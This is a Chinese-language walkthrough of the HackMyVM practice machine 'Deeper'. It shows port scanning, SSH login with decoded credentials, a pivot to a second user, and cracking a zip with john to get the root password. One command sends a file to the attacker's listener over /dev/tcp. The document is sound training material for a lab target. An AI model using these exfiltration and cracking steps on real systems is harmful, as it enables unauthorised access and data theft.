# hmv_Deeper

# 0.简介

**靶机**：[hackmyvm - Deeper](https://hackmyvm.eu/machines/machine.php?vm=Deeper)
**难度**：绿色
**目标 IP**：192.168.205.143
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 16:34 CST
Nmap scan report for 192.168.205.143
Host is up (0.00046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:49:23:DF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds
```

# 2.踩点

![Image](https://github.com/user-attachments/assets/91ecf9bd-ad4e-46cc-a738-92bfc7524a8b)

加上

![Image](https://github.com/user-attachments/assets/a2ee96a4-dce7-48ce-b94c-68125e7b3459)

![Image](https://github.com/user-attachments/assets/f7e4d481-8c35-47be-ba4d-88c63577b3c6)

![Image](https://github.com/user-attachments/assets/6ca74cb9-75f8-49fe-8abb-fb13d0bd5c02)

解码（[cyberchef](https://cyberchef.org/)）

![Image](https://github.com/user-attachments/assets/5a25d1be-e84d-4793-948c-0a3678f8ceaa)

![Image](https://github.com/user-attachments/assets/c68825cd-5fbd-459d-aed3-0a45900572b1)

# 3.提权

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh alice@192.168.205.143                                             
The authenticity of host '192.168.205.143 (192.168.205.143)' can't be established.
ED25519 key fingerprint is SHA256:LsWOF4O2aDb/w6V7Z5VEAcjNfkxMmPOzyEIC7HMr91o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.143' (ED25519) to the list of known hosts.
alice@192.168.205.143's password: 
Linux deeper 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Aug 26 00:38:16 2023 from 192.168.100.103
alice@deeper:~$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice)
alice@deeper:~$ sudo -l
[sudo] password for alice: 
Sorry, user alice may not run sudo on deeper.
alice@deeper:~$ ls -la
total 32
drwxr--r-- 3 alice alice 4096 Aug 26  2023 .
drwxr-xr-x 4 root  root  4096 Aug 25  2023 ..
lrwxrwxrwx 1 alice alice    9 Aug 25  2023 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 Aug 25  2023 .bash_logout
-rw-r--r-- 1 alice alice 3526 Aug 25  2023 .bashrc
-rw-r--r-- 1 alice alice   41 Aug 25  2023 .bob.txt
drwxr-xr-x 3 alice alice 4096 Aug 26  2023 .local
-rw-r--r-- 1 alice alice  807 Aug 25  2023 .profile
-rw-r--r-- 1 alice alice   33 Aug 26  2023 user.txt
alice@deeper:~$ cat .bob.txt
535746745247566c634556756233566e61413d3d

```

![Image](https://github.com/user-attachments/assets/6cba623b-f063-4b85-93e5-72e751571700)

```bash
alice@deeper:/home$ su - bob
Password: 
bob@deeper:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@deeper:~$ sudo -l
[sudo] password for bob: 
Sorry, user bob may not run sudo on deeper.
bob@deeper:~$ ls -la
total 28
drwxr--r-- 3 bob  bob  4096 Aug 26  2023 .
drwxr-xr-x 4 root root 4096 Aug 25  2023 ..
lrwxrwxrwx 1 bob  bob     9 Aug 25  2023 .bash_history -> /dev/null
-rw-r--r-- 1 bob  bob   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 bob  bob  3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 bob  bob  4096 Aug 25  2023 .local
-rw-r--r-- 1 bob  bob   807 Aug 25  2023 .profile
-rw-r--r-- 1 bob  bob   215 Aug 26  2023 root.zip
bob@deeper:~$ cat root.zip > /dev/tcp/192.168.205.141/7777

#kali
┌──(kali㉿kali)-[~/test/tmp]
└─$ nc -lvnp 7777 > root.zip 
listening on [any] 7777 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 40706
                                                 
┌──(kali㉿kali)-[~/test/tmp]
└─$ zip2john root.zip > hash                          
ver 1.0 efh 5455 efh 7875 root.zip/root.txt PKZIP Encr: 2b chk, TS_chk, cmplen=33, decmplen=21, crc=2D649941 ts=BA81 cs=ba81 type=0
                                                                                                                                   
┌──(kali㉿kali)-[~/test/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                   
┌──(kali㉿kali)-[~/test/tmp]
└─$ john --show hash                                  
root.zip/root.txt:bob:root.txt:root.zip::root.zip

1 password hash cracked, 0 left                                              
                                 
┌──(kali㉿kali)-[~/test/tmp]
└─$ unzip root.zip
Archive:  root.zip
[root.zip] root.txt password: 
 extracting: root.txt                                                                                                                                               
                                                                                                                                 
┌──(kali㉿kali)-[~/test/tmp]
└─$ cat root.txt
root:IhateMyPassword
                                
```

登录root

```bash
bob@deeper:~$ su -
Password: 
root@deeper:~# id
uid=0(root) gid=0(root) groups=0(root)

```